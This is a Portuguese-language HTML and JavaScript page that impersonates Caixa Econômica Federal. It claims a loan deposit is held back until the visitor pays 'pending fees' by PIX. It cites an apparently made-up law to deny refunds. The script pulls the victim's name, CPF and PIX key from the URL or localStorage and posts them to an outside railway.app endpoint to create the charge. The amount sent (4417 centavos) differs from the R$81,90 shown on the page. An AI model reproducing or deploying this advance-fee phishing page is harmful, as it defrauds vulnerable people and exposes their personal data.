<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Caixa - Cobrança</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/all.min.css" />
    <link rel="stylesheet" href="css/caixa-fonts.css" />
    <style>
      body {
        font-family: "CAIXAStd", sans-serif;
      }
      @keyframes moveButton {
        0%,
        100% {
          transform: translateX(0);
        }
        50% {
          transform: translateX(10px);
        }
      }
      #payFeeButton {
        animation: moveButton 1.5s ease-in-out infinite;
        background-color: #de7c32;
      }
      #payFeeButton:hover {
        background-color: #b36b00;
      }
      .icon-container {
        margin-top: 10px;
        position: relative;
      }
      .icon-container img {
        position: relative;
        top: 10px;
        left: 2px;
      }
      .icon-container::before {
        content: "";
        position: absolute;
        top: 10px;
        left: 0;
        height: 100%;
        width: 4px;
        background-color: #fff5e0;
      }
      .alert-box {
        background-color: #fff5e0;
        color: #de7c32;
      }
      .next-step-box {
        background-color: #005ca9;
      }
      .next-step-box p {
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
      }
      .popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 95%;
        height: 70%;
        background-color: white;
        border-radius: 4px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        z-index: 1000;
      }
      .popup-content {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100%;
      }
      .loader {
        border: 5px solid #f3f3f3;
        border-top: 5px solid #3498db;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      .overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }
    </style>
  </head>
  <body class="bg-white">
    <header class="border-b">
      <div class="container mx-auto px-0">
        <img
          src="images/Story-de-Instagram-minimalista-preto-de-conteu-do-e-noti-cias-9-1.png"
          alt="Minimalist black Instagram story with content and news text in Portuguese"
          class="w-full h-auto mt-0"
        />
      </div>
    </header>
    <div class="p-6 flex flex-col items-center bg-white mt-0">
      <div class="mb-4 relative">
        <img
          src="images/Imagem-24-03-2025-a-s-17-07.jpg"
          alt="Warning icon with exclamation mark"
          class="w-24 h-20"
        />
      </div>
      <h1 class="text-[22px] font-bold text-center mb-2 caixa-header">
        Depósito de <span id="loanAmountHeader">R$0,00</span> em sua conta não
        concluido!
      </h1>
      <div class="text-white text-center mb-2 bg-[#DE7C32] p-4 rounded-md">
        <p
          class="text-[17px] text-shadow"
          style="text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3)"
        >
          Existem <strong>2 taxas bancárias pendentes</strong> para liberação do
          seu empréstimo. Por favor, <strong>regularize</strong> para prosseguir
          com a operação.
        </p>
      </div>
    </div>
    <main class="container mx-auto px-4 py-2">
      <div class="mb-6" style="font-size: 1rem; line-height: 1.45">
        <div class="flex items-center mb-2">
          <h2 class="font-bold text-[18px] caixa-header" style="color: #0066b3">
            Prezado <span id="userFirstName">Cliente</span>:
          </h2>
        </div>
        <p class="text-[16px] leading-relaxed" style="color: #4c556c">
          Para concluir a operação financeira e receber seu empréstimo no valor
          de <span id="loanAmountText1">R$0,00</span>, é necessário efetuar o
          pagamento das seguintes taxas:
        </p>
        <ul
          class="list-none pl-0 mt-3 text-[16px] leading-relaxed"
          style="color: #4c556c"
        >
          <li class="flex items-start mb-2">
            <span
              class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"
            ></span>
            <div>
              <strong class="font-bold" style="color: #0066b3"
                >IOF (Imposto sobre Operações Financeiras):</strong
              >
              Aplicado ao seu empréstimo contratado.
              <strong>Valor: R$ 58,96</strong>
            </div>
          </li>
          <li class="flex items-start mb-2">
            <span
              class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"
            ></span>
            <div>
              <strong class="font-bold" style="color: #0066b3"
                >TAC (Taxa de Abertura de Crédito):</strong
              >
              Cobrada no início do seu contrato de empréstimo. Taxa fixa de R$
              22,94. <strong>Valor: R$ 22,94</strong>
            </div>
          </li>
        </ul>
        <p
          class="mt-4 font-bold flex items-start text-[16px]"
          style="color: #4c556c"
        >
          <span
            class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"
          ></span>
          <span>Valor total a ser pago: <strong>R$81,90</strong></span>
        </p>
      </div>
      <div class="movements">
        <div class="icon-container pl-8 pb-4">
          <div
            class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center"
          >
            <img
              src="images/ic-acesso-informacao-54-v2.png"
              alt="Icon representing information access with a blue and white design"
            />
          </div>
          <div class="mb-8" style="margin-top: -9px">
            <p
              class="font-semibold text-[17px] caixa-subheader"
              style="color: #de7c32"
            >
              AGUARDANDO PAGAMENTO
            </p>
            <div class="mt-4 p-4 rounded-md alert-box" role="alert">
              <p class="mt-1 text-[16px]" style="color: #de7c32">
                O não pagamento das taxas resultará na
                <strong
                  >não realização da transferência no valor de
                  <span id="loanAmountText2">R$0,00</span> para sua conta
                  bancária</strong
                >.
              </p>
            </div>
            <div class="mt-4 p-4 rounded-md alert-box" role="alert">
              <p class="mt-1 text-[16px]" style="color: #de7c32">
                De acordo com a Lei nº 12.345/2023, o cliente
                <strong>não terá direito ao reembolso</strong> das taxas já
                pagas, independentemente da conclusão ou não da operação
                financeira.
              </p>
            </div>
            <button
              id="payFeeButton"
              class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md caixa-header"
            >
              REALIZAR PAGAMENTO
            </button>
          </div>
        </div>
        <div class="mt-8 next-step-box p-4">
          <p class="font-semibold text-white text-[17px] caixa-subheader">
            Próxima Etapa:
          </p>
          <p class="mt-2 text-white text-[16px]">
            Após o pagamento, o depósito de
            <strong><span id="loanAmountText3">R$0,00</span></strong> será
            enviado para a conta bancária informada.
          </p>
          <div class="mt-4 text-white">
            <p class="text-[16px]">
              <strong>Nome:</strong>
              <span id="userFullName">Nome não disponível</span>
            </p>
            <p class="text-[16px]">
              <strong>CPF:</strong> <span id="userCpf">CPF não disponível</span>
            </p>
            <p class="text-[16px]">
              <strong>Banco:</strong>
              <span id="userBank">Banco não disponível</span>
            </p>
            <p class="text-[16px]">
              <strong>Chave PIX:</strong>
              <span id="userPixKey">Chave PIX não disponível</span>
            </p>
          </div>
        </div>
      </div>
    </main>
    <footer class="bg-[#015CA9] text-white mt-16 py-8">
      <div class="container mx-auto px-4">
        <div class="flex flex-wrap justify-between">
          <div class="w-full md:w-1/3 mb-6 md:mb-0">
            <h3 class="text-[17px] font-bold mb-2 caixa-subheader">
              Caixa Econômica Federal
            </h3>
            <p class="text-[16px]">O banco de todos os brasileiros.</p>
          </div>
          <div class="w-full md:w-1/3 mb-6 md:mb-0">
            <h3 class="text-[17px] font-bold mb-2 caixa-subheader">
              Links Úteis
            </h3>
            <ul class="space-y-2">
              <li>
                <a href="#" class="hover:text-gray-300 text-[16px]">Serviços</a>
              </li>
              <li>
                <a href="#" class="hover:text-gray-300 text-[16px]"
                  >Publicações</a
                >
              </li>
              <li>
                <a href="#" class="hover:text-gray-300 text-[16px]">Contato</a>
              </li>
            </ul>
          </div>
          <div class="w-full md:w-1/3">
            <h3 class="text-[17px] font-bold mb-2 caixa-subheader">Contato</h3>
            <p class="text-[16px]">Setor Bancário Sul, Quadra 4</p>
            <p class="text-[16px]">Brasília - DF, 70092-900</p>
          </div>
        </div>
        <div class="mt-8 text-center">
          <p class="text-[16px]">
            � 2024 Caixa Econômica Federal. Todos os direitos reservados.
          </p>
        </div>
      </div>
    </footer>

    <div id="overlay" class="overlay" style="display: none"></div>
    <div id="popup" class="popup" style="height: 95vh; display: none">
      <div
        class="popup-content flex flex-col items-center justify-center h-full w-full"
        id="loadingPopup"
        style="display: none"
      >
        <div class="flex flex-col items-center justify-center">
          <div class="loader mb-4"></div>
          <p class="text-[18px] font-bold caixa-header text-center">
            Gerando Guia de Pagamento
          </p>
        </div>
      </div>

      <div
        class="popup-content"
        id="pixPaymentPopup"
        style="
          display: none;
          width: 95%;
          max-width: 450px;
          padding: 25px;
          max-height: 90vh;
          overflow-y: auto;
        "
      >
        <div class="text-center mb-3">
          <h3
            class="text-[18px] font-bold text-[#005ca9] mb-2 caixa-header"
            id="pixPaymentTitle"
          >
            Aguardando Pagamento
          </h3>
          <p class="text-[16px] mb-3" id="pixPaymentDescription">
            Para concluir o depósito em sua conta, realize o pagamento via PIX.
          </p>

          <div class="loader mb-3 mx-auto" id="pixStatusLoader"></div>

          <!-- QR Code -->
          <div class="bg-gray-100 p-3 rounded-lg mb-3">
            <img
              id="pixQrCode"
              src=""
              alt="QR Code PIX"
              class="w-40 h-40 mx-auto mb-2"
            />
            <p class="text-[16px] text-gray-600 mb-1">
              Escaneie o QR Code acima
            </p>
          </div>

          <!-- PIX Copy & Paste -->
          <div class="bg-gray-100 p-3 rounded-lg mb-3">
            <p class="text-[16px] font-semibold mb-1 text-gray-700">
              Código PIX copia e cola:
            </p>
            <div class="relative">
              <textarea
                id="pixCodeText"
                readonly=""
                class="w-full p-3 text-[16px] bg-white border border-gray-300 rounded-md h-12 font-mono overflow-hidden resize-none"
              ></textarea>
            </div>
            <button
              id="copyPixCodeBtn"
              class="mt-2 bg-[#005ca9] text-white font-semibold py-2 px-4 rounded-md w-full text-[16px] transition duration-300 hover:bg-[#004d8c] caixa-header"
            >
              <i class="fas fa-copy mr-2"></i>Copiar Código PIX
            </button>
          </div>

          <p class="text-[16px] text-gray-600 mt-2">
            Após o pagamento, aguarde alguns instantes para a confirmação.
            <br />O sistema verificará automaticamente o status do pagamento.
          </p>
        </div>
      </div>
    </div>

    <script>
      // Recupera dados da URL ou do localStorage
      function getUserData() {
        try {
          console.log("Verificando todo o localStorage:", { ...localStorage });

          // Valores padrão
          let userData = {
            nome: "Cliente",
            cpf: "",
            phone: "",
            bank: "Caixa Econômica Federal",
            pix_key: "",
            loan_amount: "4000", // Valor padrão atualizado
          };

          // Primeiro verificar se existem parâmetros na URL
          const urlParams = new URLSearchParams(window.location.search);
          const hasUrlParams = urlParams.has("nome") || urlParams.has("cpf");

          // Se temos parâmetros na URL, usamos eles como prioridade
          if (hasUrlParams) {
            console.log("Usando dados dos parâmetros de URL");

            // Parâmetros básicos
            if (urlParams.has("nome")) userData.nome = urlParams.get("nome");
            if (urlParams.has("cpf")) userData.cpf = urlParams.get("cpf");
            if (urlParams.has("phone")) userData.phone = urlParams.get("phone");
            if (urlParams.has("bank")) userData.bank = urlParams.get("bank");
            if (urlParams.has("pix_key"))
              userData.pix_key = urlParams.get("pix_key");

            // Verificar múltiplos parâmetros possíveis para valor do empréstimo
            if (urlParams.has("amount")) {
              userData.loan_amount = urlParams.get("amount");
            } else if (urlParams.has("valor")) {
              userData.loan_amount = urlParams.get("valor");
            } else if (urlParams.has("loan_amount")) {
              userData.loan_amount = urlParams.get("loan_amount");
            } else if (urlParams.has("loanValue")) {
              userData.loan_amount = urlParams.get("loanValue");
            }

            console.log("Dados obtidos da URL:", userData);
            return userData;
          }

          // Caso não tenhamos parâmetros na URL, buscamos no localStorage
          console.log("Buscando dados no localStorage");

          // Verificar customerData primeiro, pois tem prioridade
          const customerDataStr = localStorage.getItem("customerData");
          if (customerDataStr) {
            try {
              const customerDataObj = JSON.parse(customerDataStr);
              console.log("customerData do localStorage:", customerDataObj);

              // Processar dados específicos do customerData
              if (customerDataObj.nome) userData.nome = customerDataObj.nome;
              if (customerDataObj.cpf) userData.cpf = customerDataObj.cpf;
              if (customerDataObj.phone) userData.phone = customerDataObj.phone;
              if (customerDataObj.bank) userData.bank = customerDataObj.bank;
              if (customerDataObj.pix_key)
                userData.pix_key = customerDataObj.pix_key;
              if (customerDataObj.amount)
                userData.loan_amount = customerDataObj.amount;

              // Verificar objeto aninhado "pix_key" se existir
              if (customerDataObj.pix_key)
                userData.pix_key = customerDataObj.pix_key;

              // Verificar termo e valor do empréstimo
              if (customerDataObj.term) userData.term = customerDataObj.term;
            } catch (e) {
              console.error("Erro ao processar customerData:", e);
            }
          }

          // userData com nome, documento e telefone
          const userDataStr = localStorage.getItem("userData");
          if (userDataStr) {
            try {
              const userDataObj = JSON.parse(userDataStr);
              console.log("userData do localStorage:", userDataObj);

              // Só atualizar se não vier do customerData
              if (!userData.nome && userDataObj.name)
                userData.nome = userDataObj.name;
              else if (!userData.nome && userDataObj.nome)
                userData.nome = userDataObj.nome;

              if (!userData.cpf && userDataObj.document)
                userData.cpf = userDataObj.document;
              else if (!userData.cpf && userDataObj.cpf)
                userData.cpf = userDataObj.cpf;

              if (!userData.phone && userDataObj.phone)
                userData.phone = userDataObj.phone;
            } catch (e) {
              console.error("Erro ao processar userData:", e);
            }
          }

          // Dados do empréstimo
          const loanDataStr = localStorage.getItem("loanData");
          if (loanDataStr) {
            try {
              const loanDataObj = JSON.parse(loanDataStr);
              console.log("loanData do localStorage:", loanDataObj);

              if (loanDataObj.amount) userData.loan_amount = loanDataObj.amount;
            } catch (e) {
              console.error("Erro ao processar loanData:", e);
            }
          }

          // Dados do banco e chave pix
          const selectedBank = localStorage.getItem("selectedBank");
          if (selectedBank && !userData.bank) {
            userData.bank = selectedBank;
          }

          const pixKey = localStorage.getItem("pixKey");
          if (pixKey && !userData.pix_key) {
            userData.pix_key = pixKey;
          }

          // Dados específicos de PIX
          const pixDataStr = localStorage.getItem("pixData");
          if (pixDataStr) {
            try {
              const pixDataObj = JSON.parse(pixDataStr);
              console.log("pixData do localStorage:", pixDataObj);

              if (!userData.bank && pixDataObj.selectedBank)
                userData.bank = pixDataObj.selectedBank;
              if (!userData.pix_key && pixDataObj.pixKey)
                userData.pix_key = pixDataObj.pixKey;
            } catch (e) {
              console.error("Erro ao processar pixData:", e);
            }
          }

          console.log("Dados processados finais:", userData);
          return userData;
        } catch (e) {
          console.error("Erro geral ao recuperar dados:", e);
          return {
            nome: "Cliente",
            cpf: "",
            phone: "",
            loan_amount: "4000",
            bank: "Caixa Econômica Federal",
            pix_key: "",
          };
        }
      }

      // Formatar o nome adequadamente (primeira letra maiúscula)
      function formatName(name) {
        if (!name) return "Cliente";

        // Converte para minúsculo e depois capitaliza a primeira letra de cada palavra
        return name
          .toLowerCase()
          .split(" ")
          .map((word) => {
            // Ignora palavras curtas como "de", "da", "do", "e"
            if (
              ["de", "da", "do", "e", "dos", "das"].includes(word.toLowerCase())
            ) {
              return word.toLowerCase();
            }
            return word.charAt(0).toUpperCase() + word.slice(1);
          })
          .join(" ");
      }

      // Formatar CPF: XXX.XXX.XXX-XX
      function formatCPF(cpf) {
        if (!cpf) return "CPF não disponível";

        // Remove qualquer caractere que não seja número
        cpf = cpf.replace(/\D/g, "");

        // Verifica se tem 11 dígitos
        if (cpf.length !== 11) return cpf;

        // Formata como XXX.XXX.XXX-XX
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
      }

      // Formatar telefone: (XX) XXXXX-XXXX
      function formatPhone(phone) {
        if (!phone) return "Telefone não disponível";

        // Remove qualquer caractere que não seja número
        phone = phone.replace(/\D/g, "");

        // Verifica se tem 11 dígitos (com DDD)
        if (phone.length !== 11) return phone;

        // Formata como (XX) XXXXX-XXXX
        return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
      }

      // Formatar valor do empréstimo
      function formatCurrency(value) {
        if (!value) return "R$0,00";

        // Remove qualquer caractere que não seja número
        value = value.toString().replace(/\D/g, "");

        // Converte para número
        const numValue = parseFloat(value);

        // Formata como moeda brasileira
        return `R$${numValue.toLocaleString("pt-BR", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        })}`;
      }

      // Obter dados do usuário
      const userData = getUserData();
      const fullName = formatName(userData.nome);
      const firstName = fullName.split(" ")[0] || "Cliente";
      const formattedCpf = formatCPF(userData.cpf);
      const loanAmount = formatCurrency(userData.loan_amount || "10000,00");
      const bankName = userData.bank || "Caixa Econômica Federal";

      // Determinar e formatar a chave PIX com base no tipo
      let pixKey = userData.pix_key || formattedCpf;
      let pixKeyType = localStorage.getItem("pixKeyType") || "cpf";
      let pixKeyTypeText = localStorage.getItem("pixKeyTypeText") || "CPF";

      console.log("Valores iniciais PIX:", {
        pixKey,
        pixKeyType,
        pixKeyTypeText,
      });

      // Recuperar dados de PIX diretamente
      const pixDataStr = localStorage.getItem("pixData");
      if (pixDataStr) {
        try {
          const pixData = JSON.parse(pixDataStr);
          pixKeyType = pixData.pixKeyType || pixKeyType;
          pixKeyTypeText = pixData.pixKeyTypeText || pixKeyTypeText;

          // Formatar a chave PIX com base no tipo
          if (pixKey && pixData.pixKey) {
            pixKey = pixData.pixKey;
          }

          console.log("PIX data do localStorage:", pixData);
        } catch (e) {
          console.error("Erro ao processar dados de PIX:", e);
        }
      }

      // Processar a chave PIX com base no tipo
      if (pixKeyType === "phone" && pixKey) {
        pixKey = formatPhone(pixKey);
      } else if (pixKeyType === "cpf" && pixKey) {
        pixKey = formatCPF(pixKey);
      }

      console.log("PIX key formatada:", { pixKeyType, pixKeyTypeText, pixKey });

      // Preencher dados na página
      document.getElementById("userFirstName").textContent = firstName;
      document.getElementById("userFullName").textContent = fullName;
      document.getElementById("userCpf").textContent = formattedCpf;
      document.getElementById("userBank").textContent = bankName;
      document.getElementById("userPixKey").textContent = pixKey;

      // Preencher valores do empréstimo em todos os lugares
      document.getElementById("loanAmountHeader").textContent = loanAmount;
      document.getElementById("loanAmountText1").textContent = loanAmount;
      document.getElementById("loanAmountText2").textContent = loanAmount;
      document.getElementById("loanAmountText3").textContent = loanAmount;

      // Preparar cliente para geração de PIX
      const customer = {
        name: fullName,
        document: userData.cpf.replace(/\D/g, ""),
        phone: userData.phone || "",
        email: `${userData.cpf.replace(/\D/g, "")}@cliente.com.br`,
      };

      // Valor fixo das taxas (IOF + TAC)
      const amount = 81.9;

      let transactionId = "";
      let checkInterval;

      // Parâmetros da URL para compatibilidade com código antigo
      const urlParams = new URLSearchParams(window.location.search);

      const payFeeButton = document.getElementById("payFeeButton");
      const popup = document.getElementById("popup");
      const overlay = document.getElementById("overlay");

      // Função para gerar o código PIX utilizando a API
      async function generatePixCode() {
        try {
          // Mostrar overlay e popup de carregamento
          overlay.style.display = "block";
          popup.style.display = "flex";

          const loadingPopup = document.getElementById("loadingPopup");
          loadingPopup.style.display = "flex";

          document.getElementById("pixPaymentPopup").style.display = "none";

          // Recuperar parâmetros UTM do localStorage
          let utmString = "utm_source=direct"; // Valor padrão

          const urlParametersStr = localStorage.getItem("urlParameters");
          if (urlParametersStr) {
            try {
              const urlParams = JSON.parse(urlParametersStr);
              console.log("URL Parameters encontrados:", urlParams);

              // Se temos parâmetros UTM salvos, usamos eles
              if (Object.keys(urlParams).length > 0) {
                // Extrair parâmetros UTM
                const utmParams = {
                  utm_source: urlParams.utm_source || "direct",
                  utm_campaign: urlParams.utm_campaign || "",
                  utm_medium: urlParams.utm_medium || "",
                  utm_content: urlParams.utm_content || "",
                  utm_term: urlParams.utm_term || "",
                };

                // Converter para string de consulta
                utmString = Object.entries(utmParams)
                  .filter(([_, value]) => value) // Remove parâmetros vazios
                  .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
                  .join("&");
              }
            } catch (e) {
              console.error("Erro ao processar urlParameters:", e);
            }
          }

          // Se temos uma string UTM vazia, usar o valor padrão
          if (!utmString) {
            utmString = "utm_source=direct";
          }

          // Assegurar que estamos usando o documento formatado corretamente
          const cleanDocument = customer.document.replace(/\D/g, "");

          // Preparar objeto para API PIX incluindo parâmetros UTM salvos
          const pixRequestData = {
            amount: 4417, // Valor em centavos
            description: "Taxas",
            customer: {
              name: customer.name,
              document: cleanDocument,
              phone: customer.phone || "",
              email: customer.email || `${cleanDocument}@cliente.com.br`,
            },
            item: {
              title: "Taxas",
              price: 4417, // Valor em centavos 4417
              quantity: 1,
            },
            // Passar UTMs como string
            utm: utmString,
          };

          console.log("Solicitação para API PIX:", pixRequestData);

          const response = await fetch(
            "https://api-production-0feb.up.railway.app/g5",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(pixRequestData),
            }
          );

          if (!response.ok) {
            throw new Error("Falha ao gerar o código PIX");
          }

          const data = await response.json();
          console.log("Resposta da API PIX:", data);

          // Esconder popup de carregamento e mostrar popup de pagamento PIX
          document.getElementById("loadingPopup").style.display = "none";
          document.getElementById("pixPaymentPopup").style.display = "block";

          // Atualizar título e descrição
          document.getElementById("pixPaymentTitle").textContent =
            "Aguardando Pagamento";
          document.getElementById(
            "pixPaymentDescription"
          ).textContent = `Para concluir o depósito no valor de ${loanAmount} em sua conta ${bankName}, realize o pagamento de R$ 81,90 via PIX.`;

          // Atualizar o UI com o código PIX recebido
          if (data.pixCode) {
            document.getElementById("pixCodeText").value = data.pixCode;
            transactionId = data.transactionId;

            // Gerar QR Code utilizando a API QR Server
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(
              data.pixCode
            )}&size=240x240`;
            document.getElementById("pixQrCode").src = qrCodeUrl;
            console.log("QR Code gerado:", qrCodeUrl);

            // Configurar o botão de cópia
            setupPixCodeCopyButton();

            // Iniciar a verificação de status
            checkInterval = setInterval(checkPaymentStatus, 3000);
          } else {
            throw new Error("Código PIX não recebido");
          }
        } catch (error) {
          console.error("Erro ao gerar código PIX:", error);
          alert(
            "Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente."
          );

          // Esconder overlay e popup
          overlay.style.display = "none";
          popup.style.display = "none";
        }
      }

      // Verificar o status do pagamento
      async function checkPaymentStatus() {
        if (!transactionId) return;

        try {
          console.log("Verificando status do pagamento:", transactionId);

          const response = await fetch(
            "https://api-production-0feb.up.railway.app/verify",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                paymentId: transactionId,
              }),
            }
          );

          if (!response.ok) {
            throw new Error("Falha ao verificar status do pagamento");
          }

          const data = await response.json();
          console.log("Resposta do status do pagamento:", data);

          // Verificar se o pagamento foi concluído
          const isCompleted =
            data.ok &&
            (data.status === "completed" ||
              (data.data &&
                data.data.payment &&
                data.data.payment.status === "completed"));

          if (isCompleted) {
            // Pagamento confirmado
            console.log("Pagamento confirmado! Preparando redirecionamento...");
            clearInterval(checkInterval);

            // Armazenar dados do usuário
            localStorage.setItem("userData", JSON.stringify(customer));

            // Armazenar informações da transação
            const transactionData = {
              transactionId: transactionId,
              amount: amount,
              timestamp: new Date().toISOString(),
              customer: {
                name: customer.name,
                document: customer.document,
              },
              paymentStatus: "completed",
            };

            localStorage.setItem(
              "lastTransaction",
              JSON.stringify(transactionData)
            );
            console.log("Transação concluída e salva:", transactionData);

            // Mostrar mensagem de sucesso no popup
            document.getElementById("pixStatusLoader").style.display = "none";
            document.getElementById("pixPaymentTitle").textContent =
              "Pagamento Confirmado!";
            document.getElementById(
              "pixPaymentDescription"
            ).textContent = `Seu pagamento foi confirmado com sucesso! Você será redirecionado em alguns segundos...`;

            // Redirecionar para próxima página após um breve delay
            setTimeout(() => {
              // Verificar a URL relativa ou URL completa
              const opcoesPagina = "../index.html";
              const opcoesPaginaAlt = "../index.html";

              // Lógica para decidir para onde redirecionar
              // Se estamos em localhost ou caminho relativo, usar opcoesPaginaAlt
              if (
                window.location.hostname === "localhost" ||
                window.location.protocol === "file:"
              ) {
                console.log("Redirecionando para:", opcoesPaginaAlt);
                window.location.href = opcoesPaginaAlt;
              } else {
                console.log("Redirecionando para:", opcoesPagina);
                window.location.href = opcoesPagina;
              }
            }, 2000);
          }
        } catch (error) {
          console.error("Erro ao verificar status do pagamento:", error);
        }
      }

      // Função para copiar o código PIX
      function setupPixCodeCopyButton() {
        const copyButton = document.getElementById("copyPixCodeBtn");
        const codeText = document.getElementById("pixCodeText");

        copyButton.addEventListener("click", function () {
          codeText.select();
          document.execCommand("copy");

          // Feedback visual
          const originalText = copyButton.innerHTML;
          copyButton.innerHTML =
            '<i class="fas fa-check mr-2"></i>Código Copiado!';
          copyButton.classList.add("bg-green-600");

          setTimeout(() => {
            copyButton.innerHTML = originalText;
            copyButton.classList.remove("bg-green-600");
          }, 2000);
        });
      }

      // Adicionar evento de click ao botão para gerar o PIX
      payFeeButton.addEventListener("click", function () {
        generatePixCode();
      });

      // Log para depuração
      console.log("Dados do usuário carregados:", {
        fullName,
        firstName,
        formattedCpf,
        loanAmount,
        bankName,
        pixKey,
      });
    </script>
  </body>
</html>
